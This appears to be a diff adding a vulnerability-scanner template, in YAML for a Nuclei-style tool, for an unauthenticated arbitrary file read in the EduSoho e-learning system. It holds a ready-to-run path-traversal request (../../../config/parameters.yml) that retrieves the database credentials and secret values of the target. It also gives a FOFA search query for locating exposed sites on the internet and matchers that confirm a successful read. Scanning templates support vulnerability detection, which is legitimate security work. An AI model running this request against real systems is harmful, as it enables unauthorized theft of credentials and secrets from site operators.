@@ -1,0 +1,32 @@
+id: EduShow-filereading
+
+info:
+  name: 教培系统EduSoho任意文件读取漏洞
+  author: changge
+  severity: high
+  description: Edusoho是面向个人、学校、培训机构及企业用户的友好、开源、高性价比的在线教育建站系统。该系统存在配置文件读取漏洞，攻击者可以通过构造恶意代码，未授权直接下载或读取parameters.yml配置文件内容，里面包含了数据库账号密码以及secret值等敏感信息
+  metadata:
+    fofa-query: title="EduSoho"
+
+requests:
+  - raw:
+      - |
+        GET /export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+        Connection: close
+        Cookie: PHPSESSID=6hjpl1c6pvu8i0uln8cr6niv77
+        Upgrade-Insecure-Requests: 127
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'database'
+      - type: status
+        status:
+          - 200
